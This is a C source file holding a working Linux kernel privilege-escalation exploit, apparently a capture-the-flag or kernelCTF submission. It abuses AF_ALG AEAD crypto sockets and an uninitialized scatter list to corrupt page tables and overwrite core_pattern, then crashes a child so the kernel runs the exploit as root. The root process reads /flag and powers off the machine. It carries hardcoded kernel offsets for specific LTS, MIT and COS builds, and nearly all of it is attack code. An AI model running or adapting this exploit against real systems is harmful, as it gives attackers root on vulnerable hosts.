#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>      /* Definition of SYS_* constants */
#include <unistd.h>

#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <pthread.h>
#include <sys/mman.h>
#include <linux/if_alg.h>
#include <errno.h>
#include <err.h>
#include <sched.h>
#include <openssl/evp.h>
#include <openssl/sha.h>


// Compute salt = SHA256(enc_key || auth_key)
int compute_essiv_salt(
		const uint8_t *enc_key, size_t enc_key_len,
		const uint8_t *auth_key, size_t auth_key_len,
		uint8_t *salt_out) // must be at least 32 bytes
{
	SHA256_CTX sha;
	SHA256_Init(&sha);
	SHA256_Update(&sha, enc_key, enc_key_len);
	SHA256_Update(&sha, auth_key, auth_key_len);
	SHA256_Final(salt_out, &sha);
	return 0;
}

// Decrypt IV using AES-ECB with ESSIV salt key
int essiv_decrypt_iv_ecb(
		const uint8_t *salt_key, size_t salt_len,
		const uint8_t *iv_enc, uint8_t *iv_out)
{
	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
	if (!ctx) return -1;

	const EVP_CIPHER *cipher = NULL;
	if (salt_len == 16) cipher = EVP_aes_128_ecb();
	else if (salt_len == 24) cipher = EVP_aes_192_ecb();
	else if (salt_len == 32) cipher = EVP_aes_256_ecb();
	else {
		fprintf(stderr, "Unsupported salt key size: %zu\n", salt_len);
		EVP_CIPHER_CTX_free(ctx);
		return -1;
	}

	EVP_DecryptInit_ex(ctx, cipher, NULL, salt_key, NULL);
	EVP_CIPHER_CTX_set_padding(ctx, 0);

	int outlen = 0, tmplen = 0;
	if (!EVP_DecryptUpdate(ctx, iv_out, &outlen, iv_enc, 16)) {
		EVP_CIPHER_CTX_free(ctx);
		return -1;
	}
	if (!EVP_DecryptFinal_ex(ctx, iv_out + outlen, &tmplen)) {
		EVP_CIPHER_CTX_free(ctx);
		return -1;
	}

	EVP_CIPHER_CTX_free(ctx);
	return outlen + tmplen;
}


int compute_iv(uint8_t* iv) {
	// Example: 32-byte HMAC key + 16-byte AES key
	uint8_t auth_key[32];
	uint8_t enc_key[16];
	for (int i = 0; i < 32; i++) auth_key[i] = i;
	for (int i = 0; i < 16; i++) enc_key[i] = i + 0x10;

	// 1. Compute ESSIV salt
	uint8_t salt[32];
	compute_essiv_salt(enc_key, sizeof(enc_key), auth_key, sizeof(auth_key), salt);
	uint8_t iv_enc[16], iv_dec[16];

	// Decrypt IV
	int len = essiv_decrypt_iv_ecb(salt, 32, iv, iv_dec);
	if (len <= 0) {
		fprintf(stderr, "Failed to decrypt IV\n");
		return 1;
	}
	printf("ESSIV decrypted IV: ");
	for (int i = 0; i < len; i++) printf("%02x", iv_dec[i]);
	printf("\n");


	memcpy(iv, iv_dec, 16);

}

#define PAUSE           \
{                   \
	int x;          \
	printf(":");    \
	read(0, &x, 1); \
}

#define SYSCHK(x) ({              \
		typeof(x) __res = (x);        \
		if (__res == (typeof(x))-1)   \
		err(1, "SYSCHK(" #x ")"); \
		__res;                        \
		})

char buf[0x1000000];
char payload[0x1000];

int sfd[0x100][2];

void set_cpu(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}


int sockfd[2];
int opfd_uninit = 0;
int opfd2_uninit = 0;
int pfd[2];
int pfd2[2];

int setup_uninit() {

	int tfmfd, opfd;
	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
		.salg_type   = "aead",
		.salg_name   = "authenc(hmac(sha512),cbc(aes))"
	};

	tfmfd = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (tfmfd < 0) { perror("socket"); return 1; }

	if (bind(tfmfd, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
		perror("bind"); 
		exit(0);
	}
	// Build key blob: rta header + AES-128 + HMAC key
	unsigned char key[8 + 32 + 16] = {0};
	key[0] = 0x08; key[1] = 0x00; key[2] = 0x01; key[3] = 0x00; // rta
	key[4] = 0x00; key[5] = 0x00; key[6] = 0x00; key[7] = 0x10; // AES-128
	for (int i = 0; i < 32; i++) key[8+i] = i;        // HMAC key
	for (int i = 0; i < 16; i++) key[8+32+i] = i+0x10; // AES key

	if (setsockopt(tfmfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) != 0) {
		perror("setsockopt(ALG_SET_KEY)"); return 1;
	}

	SYSCHK(pipe(pfd));
	SYSCHK(pipe(pfd2));
	write(pfd[1],buf,0x2000);
	write(pfd2[1],buf,0x2000);

	opfd = accept(tfmfd, NULL, 0);
	if (opfd < 0) { perror("accept"); close(tfmfd); return 1; }

	unsigned char iv[16] = {0};

	struct iovec iov = {buf,0x20};

	char cbuf[CMSG_SPACE(sizeof(uint32_t)) + CMSG_SPACE(sizeof(struct af_alg_iv) + sizeof(iv))];
	memset(&cbuf, 0, sizeof(cbuf));

	struct msghdr msg;
	memset(&msg, 0, sizeof(msg));
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = cbuf;
	msg.msg_controllen = sizeof(cbuf);

	/* 9) first control message: ALG_SET_OP = ENCRYPT */
	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type  = ALG_SET_OP;
	cmsg->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
	* (uint32_t *) CMSG_DATA(cmsg) = ALG_OP_DECRYPT;

	/* 10) second control message: ALG_SET_IV with nonce */
	cmsg = CMSG_NXTHDR(&msg, cmsg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type  = ALG_SET_IV;
	cmsg->cmsg_len   = CMSG_LEN(sizeof(struct af_alg_iv) + sizeof(iv));
	struct af_alg_iv *ivmsg = (struct af_alg_iv *) CMSG_DATA(cmsg);
	ivmsg->ivlen = sizeof(iv);
	memcpy(ivmsg->iv, iv, sizeof(iv));

	ssize_t sent = sendmsg(opfd, &msg, MSG_MORE);
	if (sent < 0) { perror("sendmsg"); close(opfd); close(tfmfd); return 1; }
	printf("sent %ld\n", sent);
	for(int i=0;i<0x8;i++)
		SYSCHK(splice(pfd[0],0,opfd,0,0x4,SPLICE_F_MORE));
	for(int i=0;i<0x8;i++)
		SYSCHK(splice(pfd2[0],0,opfd,0,0x4,SPLICE_F_MORE));
	SYSCHK(splice(pfd2[0],0,opfd,0,1,0));

	close(pfd[0]);
	close(pfd[1]);
	opfd_uninit = opfd;

	int val = 0x1000;
	SYSCHK(setsockopt(opfd_uninit, SOL_SOCKET, SO_RCVBUF, &val, sizeof(val)));
}


int craft_uninitialized_sgl() {
	char* pbuf = mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANON,-1,0);
	munmap(pbuf+0x1000,0x1000); // make it not accessible
	struct iovec iov[0x100] = {0};
	int iovlen = 0;


	for(iovlen;iovlen<32;iovlen++) {
		iov[iovlen].iov_base = pbuf;
		iov[iovlen].iov_len = 0x1;

	}
	printf("get iovlen %d\n", iovlen);

	struct msghdr msg;
	memset(&msg, 0, sizeof(msg));
	msg.msg_iov = iov;
	msg.msg_iovlen = 0x100;
	//PAUSE;
	recvmsg(opfd_uninit,&msg,0);
	//PAUSE;

	char* craft = pbuf;
	memset(craft,0,0x208);
	*(size_t*)&craft[0x10+0xf*0x20] = 0x4141414140; // pagelink
	*(int*)&craft[0x18+0xf*0x20] = 0; // offset
	*(int*)&craft[0x1c+0xf*0x20] = 0xffffffe0; // length
						   //

						   //	PAUSE;
	printf("craft %zx\n",(size_t)craft);
	msg.msg_control = craft;
	msg.msg_controllen = 0x208;

	sendmsg(sockfd[1], &msg, 0);
	/*
	   iov[0].iov_base = pbuf+0x1000;
	   msg.msg_iovlen = 1;
	   recvmsg(opfd_uninit,&msg,0);
	   */
}

unsigned char iv[16] = {
	0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,
	0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x10
};

int check_core()
{
        // Check if /proc/sys/kernel/core_pattern has been overwritten
        char buf[0x100] = {};
        int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
        read(core, buf, sizeof(buf));
        close(core);
        return strncmp(buf, "|/proc/%P/exe %P", 0x10) == 0;
}


#define STEXT 0xffffffff81000000UL
#if defined(LTS)  // LTS 6.12.48
#define CORE_PATTERN    (0xffffffff842107e0UL - STEXT)
#define BRK_BASE        (0xffffffff85600000UL - STEXT)

#elif defined(MIT)  // MIT v4-6.6
#define CORE_PATTERN    (0xffffffff83db3720UL - STEXT)
#define BRK_BASE        (0xffffffff84e00000UL - STEXT)

#elif defined(COS)  // COS cos-121-18867.199.56
#define CORE_PATTERN    (0xffffffff83fb4940UL - STEXT)
#define BRK_BASE        (0xffffffff85200000UL - STEXT)

#else
#error "You must define one of: LTS, MIT, or COS"
#endif

#define CORE_PATTERN_OFFSET (CORE_PATTERN&0xfff)
#define CORE_PATTERN_BASE (CORE_PATTERN&(~0xfff))

char* addrs[0x1000];
size_t stext_phys = 0;
int cfd[2];
int main(int argc, char** argv) {
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
        if (argc > 1)
        {

                int pid = strtoull(argv[1], 0, 10);
                int pfd = syscall(SYS_pidfd_open, pid, 0);
                int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
                int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
                int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
                dup2(stdinfd, 0);
                dup2(stdoutfd, 1);
                dup2(stderrfd, 2);
                system("cat /flag");
                system("cat /flag");
		system("cat /flag;echo o>/proc/sysrq-trigger");
                exit(0);
        }

	int tfmfd, opfd;

	SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockfd));
	SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, cfd));
	set_cpu(0);

	if(fork() == 0) {
		set_cpu(1);
		read(cfd[0],&stext_phys,8);
	}

	*(size_t*)&iv[0] = 0x800000000009c067;
	*(size_t*)&iv[8] = 0;
	size_t pa_target;
	if(stext_phys) {
		pa_target = stext_phys;
		pa_target += CORE_PATTERN_BASE;
		pa_target |= 0x8000000000000867;
		printf("new pa %zx\n", pa_target);
		*(size_t*)&iv[0] = pa_target;
		*(size_t*)&iv[8] = 0;
	}
	compute_iv(iv);
	//test_pause();
	setup_uninit();
        char *maddr = (void *)0x200000;
        for (int i = 0; i < 0x400; i++) {
                addrs[i] = SYSCHK(mmap(maddr + 0x200000 * i, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0));
        }


	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
		.salg_type   = "aead",
		.salg_name   = "essiv(authenc(hmac(sha256),cbc(aes)),sha256)"
	};

	tfmfd = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (tfmfd < 0) { perror("socket"); return 1; }

	if (bind(tfmfd, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
		perror("bind"); return 1;
	}

	// Build key blob: rta header + AES-128 + HMAC key
	unsigned char key[8 + 32 + 16] = {0};
	key[0] = 0x08; key[1] = 0x00; key[2] = 0x01; key[3] = 0x00; // rta
	key[4] = 0x00; key[5] = 0x00; key[6] = 0x00; key[7] = 0x10; // AES-128
	for (int i = 0; i < 32; i++) key[8+i] = i;        // HMAC key
	for (int i = 0; i < 16; i++) key[8+32+i] = i+0x10; // AES key

	if (setsockopt(tfmfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) != 0) {
		perror("setsockopt(ALG_SET_KEY)"); return 1;
	}

	opfd = accept(tfmfd, NULL, 0);
	if (opfd < 0) { perror("accept"); return 1; }

	// IV (16 bytes)

	// Plaintext
	int plen = 0x1000;

	// Setup control message for ALG_SET_OP + ALG_SET_IV
	char cbuf[CMSG_SPACE(sizeof(__u32)) + CMSG_SPACE(sizeof(struct af_alg_iv) + sizeof(iv)) + CMSG_SPACE(sizeof(__u32))];
	struct msghdr msg = {0};
	struct iovec iov = { buf, 0x20 };
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = cbuf;
	msg.msg_controllen = sizeof(cbuf);

	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
	// ALG_SET_OP
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type  = ALG_SET_OP;
	cmsg->cmsg_len   = CMSG_LEN(sizeof(__u32));
	*(__u32*)CMSG_DATA(cmsg) = ALG_OP_DECRYPT;

	cmsg = CMSG_NXTHDR(&msg, cmsg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;
	cmsg->cmsg_len   = CMSG_LEN(sizeof(__u32));
	*(__u32*)CMSG_DATA(cmsg) = 0x0;

	// ALG_SET_IV
	cmsg = CMSG_NXTHDR(&msg, cmsg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type  = ALG_SET_IV;
	cmsg->cmsg_len   = CMSG_LEN(sizeof(struct af_alg_iv) + sizeof(iv));
	struct af_alg_iv *ivmsg = (struct af_alg_iv*)CMSG_DATA(cmsg);
	ivmsg->ivlen = sizeof(iv);
	memcpy(ivmsg->iv, iv, sizeof(iv));



	//PAUSE;
	// Send plaintext + control to kernel
	int ret = sendmsg(opfd, &msg, 0);
	if (ret < 0) { perror("sendmsg"); return 1; }

	int val = 0;
	//PAUSE;
	SYSCHK(setsockopt(opfd, SOL_SOCKET, SO_RCVBUF, &val, sizeof(val)));
	// Receive ciphertext (ciphertext + auth tag)
	unsigned char ciphertext[64] = {0};


	craft_uninitialized_sgl();

        int sum = 0;
        for (int i = 0; i < 0x400; i++)
                sum += addrs[i][0];

	ret = recv(opfd, buf, 32, 0);

	char* victim_buf;

	for(int i = 0;i < 0x400;i++) {
		if(!stext_phys) {
			if(addrs[i][0]) {
				printf("Got pte %zx\n", *(size_t*)addrs[i]);
				victim_buf = addrs[i];
				size_t pa_leak = *(size_t*)victim_buf;
				size_t pa_target = pa_leak & (~0xffff);
				pa_target -= BRK_BASE;
				write(cfd[1],&pa_target,8);
				break;

			}
		} else {
			strcpy(addrs[i]+CORE_PATTERN_OFFSET, "|/proc/%P/exe %P");

		}
	}

	if(stext_phys) {
		if(fork()==0) {
			setsid();
			puts("Root shell !!");
			/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
			*(volatile size_t *)0 = 0;

		}
	}

	while(1) sleep(1);


	close(opfd);
	close(tfmfd);
	return 0;
}

